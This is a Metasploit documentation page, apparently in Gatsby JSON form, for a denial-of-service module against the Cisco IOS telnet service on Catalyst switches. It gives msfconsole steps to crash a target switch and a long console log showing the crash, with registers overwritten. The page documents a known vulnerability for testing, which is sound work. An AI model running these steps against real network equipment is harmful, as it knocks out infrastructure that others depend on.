{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/dos/cisco/ios_telnet_rocem","result":{"data":{"moduleMetadataJson":{"id":"880e93a0-1ec4-5f6b-98f8-5a0f2dda27c9","name":"Cisco IOS Telnet Denial of Service","fullname":"auxiliary/dos/cisco/ios_telnet_rocem","description":"This module triggers a Denial of Service condition in the Cisco IOS\n        telnet service affecting multiple Cisco switches. Tested against Cisco\n        Catalyst 2960 and 3750.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/dos/cisco/ios_telnet_rocem","documentationSlug":"/modules/documentation/auxiliary/dos/cisco/ios_telnet_rocem","referencesSlug":"/modules/references/auxiliary/dos/cisco/ios_telnet_rocem"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<ol>\n<li>Obtain a Cisco switch of any model indicated here that is running vulnerable firmware: <a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170317-cmp\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170317-cmp</a>. Note that the vulnerability spans many years. We tested two firmwares 10 years apart and were able to verify exploitability.</li>\n<li>Enable telnet access and verify that you can reach the switch normally via that mode.</li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use auxiliary/dos/cisco/ios_telnet_rocem</code></li>\n<li>Do: <code class=\"language-text\">set RHOST 192.168.1.10</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>The switch should restart and display crash information on the console.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">Switch#sh ver\n*Mar  1 01:28:01.802: %SYS-5-CONFIG_I: Configured from console by console\nCisco IOS Software, C3750 Software (C3750-IPBASEK9-M), Version 12.2(53)SE2, RELEASE SOFTWARE (fc3)\nTechnical Support: http://www.cisco.com/techsupport\nCopyright (c) 1986-2010 by Cisco Systems, Inc.\nCompiled Wed 21-Apr-10 04:49 by prod_rel_team\nImage text-base: 0x01000000, data-base: 0x02C00000\nROM: Bootstrap program is C3750 boot loader\nBOOTLDR: C3750 Boot Loader (C3750-HBOOT-M) Version 12.2(44)SE5, RELEASE SOFTWARE (fc1)\nSwitch uptime is 1 hour, 28 minutes\nSystem returned to ROM by power-on\nSystem image file is &quot;flash:/c3750-ipbasek9-mz.122-53.SE2/c3750-ipbasek9-mz.122-53.SE2.bin&quot;\n[...]\ncisco WS-C3750-48TS (PowerPC405) processor (revision M0) with 131072K bytes of memory.\nProcessor board ID CAT1017Z2Z2\nLast reset from power-on\n1 Virtual Ethernet interface\n48 FastEthernet interfaces\n4 Gigabit Ethernet interfaces\nThe password-recovery mechanism is enabled.\n[...]\nCisco IOS Software, C3750 Software (C3750-IPSERVICESK9-M), Version 12.2(55)SE10, RELEASE SOFTWARE (fc2)\nTechnical Support: http://www.cisco.com/techsupport\nCopyright (c) 1986-2015 by Cisco Systems, Inc.\nCompiled Wed 11-Feb-15 11:40 by prod_rel_team\nImage text-base: 0x01000000, data-base: 0x02F00000\n[...]\nElection Complete\nSwitch 2 booting as Master\nWaiting for Port download...Complete\n[...]\ncisco WS-C3750-48TS (PowerPC405) processor (revision M0) with 131072K bytes of memory.\nProcessor board ID CAT1017Z2Z2\nLast reset from power-on\n1 Virtual Ethernet interface\n48 FastEthernet interfaces\n4 Gigabit Ethernet interfaces\nThe password-recovery mechanism is enabled.\n[...]\nSwitch Ports Model              SW Version            SW Image\n------ ----- -----              ----------            ----------\n*    2 52    WS-C3750-48TS      12.2(55)SE10          C3750-IPSERVICESK9-M\n[... booted successfully, waiting at a prompt, DoS exploit follows ...]\nSwitch#\n 00:37:15 UTC Mon Mar 1 1993: Unexpected exception to CPUvector 400, PC = 41414140\n-Traceback= 41414140\nWriting crashinfo to flash:/crashinfo_ext/crashinfo_ext_1\n=== Flushing messages (00:37:19 UTC Mon Mar 1 1993) ===\nBuffered messages:\n00:00:26: %STACKMGR-4-SWITCH_ADDED: Switch 1 has been ADDED to the stack\n00:00:27: %LINEPROTO-5-UPDOWN: Line protocol on Interface Vlan1, changed state to down\n00:00:29: %SPANTREE-5-EXTENDED_SYSID: Extended SysId enabled for type vlan\n00:00:50: %STACKMGR-5-SWITCH_READY: Switch 1 is READY\n00:00:50: %STACKMGR-4-STACK_LINK_CHANGE: Stack Port 1 Switch 1 has changed to state DOWN\n00:00:50: %STACKMGR-4-STACK_LINK_CHANGE: Stack Port 2 Switch 1 has changed to state DOWN\n00:00:50: %STACKMGR-5-MASTER_READY: Master Switch 1 is READY\n00:00:50: %SYS-5-RESTART: System restarted --\nCisco IOS Software, C3750 Software (C3750-IPBASEK9-M), Version 12.2(35)SE5, RELEASE SOFTWARE (fc1)\nCopyright (c) 1986-2007 by Cisco Systems, Inc.\nCompiled Fri 20-Jul-07 01:58 by nachen\n00:01:48: %SYS-5-CONFIG_I: Configured from console by console\n00:27:53: %LINK-3-UPDOWN: Interface FastEthernet1/0/1, changed state to up\n00:27:54: %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet1/0/1, changed state to up\n00:28:22: %LINEPROTO-5-UPDOWN: Line protocol on Interface Vlan1, changed state to up\n00:30:00: %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet1/0/1, changed state to down\n00:30:00: %LINEPROTO-5-UPDOWN: Line protocol on Interface Vlan1, changed state to down\n00:30:01: %LINK-3-UPDOWN: Interface FastEthernet1/0/1, changed state to down\n00:32:44: %LINK-3-UPDOWN: Interface FastEthernet1/0/1, changed state to up\n00:32:45: %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet1/0/1, changed state to up\n00:33:13: %LINEPROTO-5-UPDOWN: Line protocol on Interface Vlan1, changed state to up\nQueued messages:\nCisco IOS Software, C3750 Software (C3750-IPBASEK9-M), Version 12.2(35)SE5, RELEASE SOFTWARE (fc1)\nCopyright (c) 1986-2007 by Cisco Systems, Inc.\nCompiled Fri 20-Jul-07 01:58 by nachen\nInstruction Access Exception (0x0400)!\nSRR0 = 0x41414140  SRR1 = 0x00029230  SRR2 = 0x00648990  SRR3 = 0x00021200\nESR = 0x00000000  DEAR = 0x00000000  TSR = 0x8C000000  DBSR = 0x00000000\nCPU Register Context:\nVector = 0x00000400  PC = 0x41414140  MSR = 0x00029230  CR = 0x53000005\nLR = 0x41414141  CTR = 0x0004D860  XER = 0xC0000050\nR0 = 0x41414141  R1 = 0x02DDEE80  R2 = 0x00000000  R3 = 0x0358907C\nR4 = 0x00000001  R5 = 0xFFFFFFFF  R6 = 0x0182C1B0  R7 = 0x00000000\nR8 = 0x00000001  R9 = 0x0290C84C  R10 = 0x00000031  R11 = 0x00000000\nR12 = 0x00221C89  R13 = 0x00110000  R14 = 0x00BD7284  R15 = 0x00000000\nR16 = 0x00000000  R17 = 0x00000000  R18 = 0x00000000  R19 = 0x00000000\nR20 = 0xFFFFFFFF  R21 = 0x00000000  R22 = 0x00000000  R23 = 0x02DDF078\nR24 = 0x00000000  R25 = 0x00000001  R26 = 0x000003FB  R27 = 0x00000024\nR28 = 0x41414141  R29 = 0x41414141  R30 = 0x41414141  R31 = 0x41414141\nStack trace:\nPC = 0x41414140, SP = 0x02DDEE80\nFrame 00: SP = 0x41414141    PC = 0x41414141\nSwitch uptime is 37 minutes, 22 seconds\n[... rebooting ... ]\nSwitch   Ports  Model              SW Version              SW Image\n------   -----  -----              ----------              ----------\n*    1   52     WS-C3750-48TS      12.2(35)SE5             C3750-IPBASEK9-M\nFailed to generate persistent self-signed certificate.\n    Secure server will use temporary self-signed certificate.\nPress RETURN to get started!\n00:00:26: %STACKMGR-4-SWITCH_ADDED: Switch 1 has been ADDED to the stack\n00:00:27: %LINEPROTO-5-UPDOWN: Line protocol on Interface Vlan1, changed state to down\n00:00:29: %SPANTREE-5-EXTENDED_SYSID: Extended SysId enabled for type vlan\n00:00:31: %SYS-5-CONFIG_I: Configured from memory by console\n00:00:31: %STACKMGR-5-SWITCH_READY: Switch 1 is READY\n00:00:31: %STACKMGR-4-STACK_LINK_CHANGE: Stack Port 1 Switch 1 has changed to state DOWN\n00:00:31: %STACKMGR-4-STACK_LINK_CHANGE: Stack Port 2 Switch 1 h\nSwitch&gt;\nSwitch&gt;as changed to state DOWN\n00:00:32: %STACKMGR-5-MASTER_READY: Master Switch 1 is READY\n00:00:32: %SYS-5-RESTART: System restarted --\nCisco IOS Software, C3750 Software (C3750-IPBASEK9-M), Version 12.2(35)SE5, RELEASE SOFTWARE (fc1)\nCopyright (c) 1986-2007 by Cisco Systems, Inc.\nCompiled Fri 20-Jul-07 01:58 by nachen\n00:00:33: %LINK-3-UPDOWN: Interface FastEthernet1/0/1, changed state to up\n00:00:34: %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet1/0/1, changed state to up\nSwitch&gt;\nSwitch&gt;\n00:01:04: %LINEPROTO-5-UPDOWN: Line protocol on Interface Vlan1, changed state to up\n00:01:32: %PLATFORM-1-CRASHED: System previously crashed with the following message:\n00:01:32: %PLATFORM-1-CRASHED: Cisco IOS Software, C3750 Software (C3750-IPBASEK9-M), Version 12.2(35)SE5, RELEASE SOFTWARE (fc1)\n00:01:32: %PLATFORM-1-CRASHED: Copyright (c) 1986-2007 by Cisco Systems, Inc.\n00:01:32: %PLATFORM-1-CRASHED: Compiled Fri 20-Jul-07 01:58 by nachen\n00:01:32: %PLATFORM-1-CRASHED:\n00:01:32: %PLATFORM-1-CRASHED: Instruction Access Exception (0x0400)!\n00:01:32: %PLATFORM-1-CRASHED:\n00:01:32: %PLATFORM-1-CRASHED: SRR0 = 0x41414140  SRR1 = 0x00029230  SRR2 = 0x00648990  SRR3 = 0x00021200\n00:01:32: %PLATFORM-1-CRASHED: ESR = 0x00000000  DEAR = 0x00000000  TSR = 0x8C000000  DBSR = 0x00000000\n00:01:32: %PLATFORM-1-CRASHED:\n00:01:32: %PLATFORM-1-CRASHED: CPU Register Context:\n00:01:32: %PLATFORM-1-CRASHED: Vector = 0x00000400  PC = 0x41414140  MSR = 0x00029230  CR = 0x53000005\n00:01:32: %PLATFORM-1-CRASHED: LR = 0x41414141  CTR = 0x0004D860  XER = 0xC0000050\n00:01:32: %PLATFORM-1-CRASHED: R0 = 0x41414141  R1 = 0x02DDEE80  R2 = 0x00000000  R3 = 0x0358907C\n00:01:32: %PLATFORM-1-CRASHED: R4 = 0x00000001  R5 = 0xFFFFFFFF  R6 = 0x0182C1B0  R7 = 0x00000000\n00:01:32: %PLATFORM-1-CRASHED: R8 = 0x00000001  R9 = 0x0290C84C  R10 = 0x00000031  R11 = 0x00000000\n00:01:32: %PLATFORM-1-CRASHED: R12 = 0x00221C89  R13 = 0x00110000  R14 = 0x00BD7284  R15 = 0x00000000\n00:01:32: %PLATFORM-1-CRASHED: R16 = 0x00000000  R17 = 0x00000000  R18 = 0x00000000  R19 = 0x00000000\n00:01:32: %PLATFORM-1-CRASHED: R20 = 0xFFFFFFFF  R21 = 0x00000000  R22 = 0x00000000  R23 = 0x02DDF078\n00:01:32: %PLATFORM-1-CRASHED: R24 = 0x00000000  R25 = 0x00000001  R26 = 0x000003FB  R27 = 0x00000024\n00:01:32: %PLATFORM-1-CRASHED: R28 = 0x41414141  R29 = 0x41414141  R30 = 0x41414141  R31 = 0x41414141\n00:01:32: %PLATFORM-1-CRASHED:\n00:01:32: %PLATFORM-1-CRASHED: Stack trace:\n00:01:32: %PLATFORM-1-CRASHED: PC = 0x41414140, SP = 0x02DDEE80\n00:01:32: %PLATFORM-1-CRASHED: Frame 00: SP = 0x41414141    PC = 0x41414141\n00:01:32: %PLATFORM-1-CRASHED:</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"880e93a0-1ec4-5f6b-98f8-5a0f2dda27c9"}}}